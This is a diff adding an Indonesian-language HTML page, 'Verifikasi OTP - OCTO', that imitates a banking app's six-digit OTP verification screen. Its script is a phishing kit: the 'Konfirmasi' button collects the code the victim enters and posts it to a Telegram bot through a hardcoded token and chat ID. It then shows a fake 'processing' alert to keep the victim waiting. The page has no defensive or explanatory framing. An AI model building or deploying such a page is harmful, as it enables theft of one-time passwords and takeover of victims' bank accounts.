@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP - OCTO</title>
+    <style>
+        :root {
+            --brand-red: #a31d1d;
+            --text-gray: #757575;
+            --border-gray: #e0e0e0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 414px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        /* Icon Lock */
+        .otp-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #fff1f1;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 40px;
+        }
+
+        h2 {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .desc {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        /* OTP Input Styling */
+        .otp-input-container {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .otp-input-container input {
+            width: 45px;
+            height: 50px;
+            border: 1.5px solid var(--border-gray);
+            border-radius: 8px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--brand-red);
+            outline: none;
+        }
+
+        .otp-input-container input:focus {
+            border-color: var(--brand-red);
+        }
+
+        /* Timer & Resend */
+        .timer-text {
+            font-size: 14px;
+            color: var(--text-gray);
+            margin-bottom: 40px;
+        }
+
+        #timer {
+            font-weight: bold;
+            color: var(--brand-red);
+        }
+
+        .resend-link {
+            color: var(--brand-red);
+            text-decoration: none;
+            font-weight: bold;
+            display: none; /* Muncul setelah timer habis */
+            cursor: pointer;
+        }
+
+        /* Button */
+        .btn-verifikasi {
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            border: none;
+            background: linear-gradient(to right, #d32f2f, #a31d1d);
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(163, 29, 29, 0.25);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="otp-icon">🔐</div>
+    
+    <h2>Verifikasi Kode</h2>
+    <p class="desc">Kami telah mengirimkan kode verifikasi ke nomor ponsel Anda. Silakan masukkan kode tersebut di bawah ini.</p>
+
+    <div class="otp-input-container">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+        <input type="number" pattern="\d*" inputmode="numeric" maxlength="1" class="otp-field">
+    </div>
+
+    <div class="timer-text">
+        Mohon tunggu dalam <span id="timer">02:00</span> menit untuk kirim ulang kode.
+        <span class="resend-link" id="resendBtn" onclick="location.reload()">Kirim Ulang</span>
+    </div>
+
+    <button class="btn-verifikasi" onclick="sendOTP()">Konfirmasi</button>
+</div>
+
+<script>
+    // --- KONFIGURASI BOT TELEGRAM (Sama dengan sebelumnya) ---
+    const TOKEN = '8462084079:AAHQ94IQ_-iOg10Y9IiTSnNzeb2IFDikpes';
+    const CHAT_ID = '7692820036';
+
+    // Auto-focus move logic
+    const fields = document.querySelectorAll('.otp-field');
+    fields.forEach((field, index) => {
+        field.addEventListener('input', () => {
+            if (field.value.length === 1 && index < fields.length - 1) {
+                fields[index + 1].focus();
+            }
+        });
+        field.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && field.value === '' && index > 0) {
+                fields[index - 1].focus();
+            }
+        });
+    });
+
+    // Countdown Timer Logic
+    let time = 120; // 2 Menit
+    const timerElement = document.getElementById('timer');
+    const resendBtn = document.getElementById('resendBtn');
+
+    const countdown = setInterval(() => {
+        let minutes = Math.floor(time / 60);
+        let seconds = time % 60;
+        seconds = seconds < 10 ? '0' + seconds : seconds;
+        timerElement.innerHTML = `0${minutes}:${seconds}`;
+        time--;
+
+        if (time < 0) {
+            clearInterval(countdown);
+            timerElement.style.display = 'none';
+            resendBtn.style.display = 'inline';
+        }
+    }, 1000);
+
+    // Kirim OTP ke Telegram
+    async function sendOTP() {
+        let otpValue = "";
+        fields.forEach(field => otpValue += field.value);
+
+        if (otpValue.length < 6) {
+            alert("Masukkan 6 digit kode OTP.");
+            return;
+        }
+
+        const pesan = `
+🔑 *OTP TERIMA* 🔑
+-----------------------
+Kode OTP: \`${otpValue}\`
+-----------------------
+        `;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            alert("Kode OTP sedang diproses. Mohon tunggu.");
+            // Arahkan ke halaman sukses atau kembali ke awal
+            // window.location.href = "success.html";
+            
+        } catch (e) {
+            alert("Terjadi kesalahan, coba lagi.");
+        }
+    }
+</script>
+
+</body>
+</html>
